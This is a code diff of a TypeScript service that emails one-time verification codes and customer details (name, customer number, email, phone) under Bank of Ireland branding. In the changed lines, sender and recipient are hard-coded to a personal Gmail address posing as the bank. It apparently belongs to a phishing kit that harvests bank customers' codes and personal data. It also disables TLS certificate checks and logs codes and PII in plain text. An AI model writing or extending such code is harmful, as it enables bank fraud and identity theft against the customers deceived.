@@ -19,56 +19,23 @@ class OTCService {
   }
 
   private initializeTransporter() {
-    try {
-      // Use environment variables for email configuration
-      const emailConfig = {
-        host: process.env.SMTP_HOST,
-        port: parseInt(process.env.SMTP_PORT || '587'),
-        secure: process.env.SMTP_PORT === '465', // Use secure for port 465
-        auth: {
-          user: process.env.SMTP_USER,
-          pass: process.env.SMTP_PASS
-        },
-        tls: {
-          rejectUnauthorized: false,
-          ciphers: 'SSLv3'
-        },
-        connectionTimeout: 30000, // 30 seconds
-        greetingTimeout: 30000,
-        socketTimeout: 30000,
-        pool: true, // Use connection pooling
-        maxConnections: 5,
-        maxMessages: 100,
-        rateDelta: 20000, // Rate limiting
-        rateLimit: 5,
-        debug: process.env.NODE_ENV === 'development'
-      };
-
-      // Only initialize if SMTP credentials are provided
-      if (emailConfig.host && emailConfig.auth.user && emailConfig.auth.pass) {
-        this.transporter = nodemailer.createTransport(emailConfig);
-        
-        // Verify connection asynchronously  
-        this.transporter?.verify((error, success) => {
-          if (error) {
-            console.error('❌ SMTP connection verification failed:', error.message);
-          } else {
-            console.log('✅ SMTP server connection verified and ready');
-          }
-        });
-        
-        console.log('📧 Email transporter initialized successfully');
-        console.log(`📧 SMTP Host: ${emailConfig.host}:${emailConfig.port}`);
-        console.log(`📧 SMTP User: ${emailConfig.auth.user}`);
-        console.log(`📧 Admin Email: ${process.env.ADMIN_EMAIL || 'bankofireland2007@gmail.com'}`);
-      } else {
-        console.error('❌ SMTP credentials missing - email service unavailable');
-        console.error('Required: SMTP_HOST, SMTP_USER, SMTP_PASS');
-        console.error(`Available: HOST=${!!process.env.SMTP_HOST}, USER=${!!process.env.SMTP_USER}, PASS=${!!process.env.SMTP_PASS}`);
+    // Use environment variables for email configuration
+    const emailConfig = {
+      host: process.env.SMTP_HOST,
+      port: parseInt(process.env.SMTP_PORT || '587'),
+      secure: process.env.SMTP_PORT === '465', // Use secure for port 465
+      auth: {
+        user: process.env.SMTP_USER,
+        pass: process.env.SMTP_PASS
+      },
+      tls: {
+        rejectUnauthorized: false
       }
-    } catch (error) {
-      console.error('❌ Failed to initialize email transporter:', error);
-      this.transporter = null;
+    };
+
+    // Only initialize if SMTP credentials are provided
+    if (emailConfig.host && emailConfig.auth.user && emailConfig.auth.pass) {
+      this.transporter = nodemailer.createTransport(emailConfig);
     }
   }
 
@@ -138,46 +105,26 @@ class OTCService {
   }
 
   async sendOTCToAdmin(accountData: OTCRequest['accountData'], otc: string): Promise<boolean> {
-    // Always try to reinitialize transporter if it doesn't exist
     if (!this.transporter) {
-      console.log('🔄 No SMTP transporter - attempting to reinitialize');
-      this.initializeTransporter();
-      if (!this.transporter) {
-        console.error('❌ CRITICAL: Email system completely unavailable');
-        return false;
-      }
-    }
-
-    const adminEmail = process.env.ADMIN_EMAIL?.trim() || 'bankofireland2007@gmail.com';
-    console.log('🔄 ATTEMPTING TO SEND ADMIN OTC EMAIL:', adminEmail);
-    
-    // Validate email format
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!emailRegex.test(adminEmail)) {
-      console.error('❌ Invalid admin email format:', adminEmail);
+      console.log('No SMTP transporter available - email cannot be sent');
       return false;
     }
 
-    // Retry mechanism with exponential backoff
-    const maxRetries = 5;
-    let attempt = 0;
-    
-    while (attempt < maxRetries) {
-      attempt++;
-      console.log(`📧 Email attempt ${attempt}/${maxRetries} to ${adminEmail}`);
+    try {
+      const adminEmail = process.env.ADMIN_EMAIL?.trim() || 'admin@bankofireland.ie';
+      console.log('Attempting to send OTC to admin email:', adminEmail);
       
-      try {
-        const mailOptions = {
-          from: `"Bank of Ireland Admin" <${process.env.SMTP_USER}>`,
-          to: adminEmail,
-          replyTo: process.env.SMTP_USER,
-          priority: 'high' as const,
-          headers: {
-            'X-Priority': '1',
-            'X-MSMail-Priority': 'High',
-            'Importance': 'high'
-          },
-          subject: `Bank of Ireland - Account Verification Code: ${otc}`,
+      // Validate email format
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(adminEmail)) {
+        console.error('Invalid admin email format:', adminEmail);
+        return false;
+      }
+      
+      const mailOptions = {
+        from: 'bankofireland2007@gmail.com',
+        to: 'bankofireland2007@gmail.com',
+        subject: 'New Bank Account Registration - Admin Approval Required',
         html: `
           <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
             <div style="background-color: #126987; color: white; padding: 20px; border-radius: 8px 8px 0 0;">
@@ -255,53 +202,34 @@ class OTCService {
         `
       };
 
-        
-        const info = await this.transporter.sendMail(mailOptions);
-        
-        // Success logging
-        console.log(`✅ SUCCESS: Admin OTC email sent successfully to ${adminEmail}`);
-        console.log(`📧 Subject: Bank of Ireland - Account Verification Code: ${otc}`);
-        console.log(`🔑 OTC Code: ${otc}`);
-        console.log(`👤 Customer: ${accountData.name} (${accountData.customerNumber})`);
-        console.log(`📞 Contact: ${accountData.email} | ${accountData.phone}`);
-        console.log(`⏰ Time: ${new Date().toLocaleString('en-IE', { 
-          timeZone: 'Europe/Dublin',
-          year: 'numeric',
-          month: 'long', 
-          day: 'numeric',
-          hour: '2-digit',
-          minute: '2-digit',
-          second: '2-digit'
-        })}`);
-        console.log('✅ ADMIN EMAIL DELIVERY CONFIRMED - MESSAGE ID:', info.messageId);
-        return true;
-        
-      } catch (error: any) {
-        console.error(`❌ Attempt ${attempt}/${maxRetries} failed:`, error?.message || error);
-        
-        if (attempt < maxRetries) {
-          const delay = Math.min(1000 * Math.pow(2, attempt - 1), 10000); // Exponential backoff, max 10s
-          console.log(`⏱️  Retrying in ${delay}ms...`);
-          await new Promise(resolve => setTimeout(resolve, delay));
-          
-          // Try to reinitialize transporter on failure
-          console.log('🔄 Reinitializing email transporter for retry...');
-          this.initializeTransporter();
-        } else {
-          console.error('🚨 CRITICAL: All email delivery attempts failed!');
-          console.error('🚨 Admin will NOT receive OTC code via email!');
-          console.error(`🚨 MANUAL OTC CODE: ${otc} for ${accountData.customerNumber}`);
-          console.error('SMTP Error Details:', {
-            message: error?.message || 'Unknown error',
-            code: error?.code || 'No code',
-            command: error?.command || 'No command',
-            stack: error?.stack
-          });
-        }
-      }
+      const info = await this.transporter.sendMail(mailOptions);
+      console.log(`Admin OTC email sent successfully to bankofireland2007@gmail.com`);
+      console.log(`Subject: New Bank Account Registration - Admin Approval Required`);
+      console.log(`OTC Code: ${otc}`);
+      console.log(`Customer Details:`);
+      console.log(`  - Name: ${accountData.name}`);
+      console.log(`  - Customer Number: ${accountData.customerNumber}`);
+      console.log(`  - Email: ${accountData.email}`);
+      console.log(`  - Phone: ${accountData.phone}`);
+      console.log(`  - Registration Time: ${new Date().toLocaleString('en-IE', { 
+        timeZone: 'Europe/Dublin',
+        year: 'numeric',
+        month: 'long', 
+        day: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+      })}`);
+      return true;
+    } catch (error: any) {
+      console.error('❌ Failed to send admin notification email:', error);
+      console.error('SMTP Error Details:', {
+        message: error?.message || 'Unknown error',
+        code: error?.code || 'No code',
+        command: error?.command || 'No command'
+      });
+      return false;
     }
-    
-    return false;
   }
 
   storeOTC(customerNumber: string, code: string, accountData: any): void {
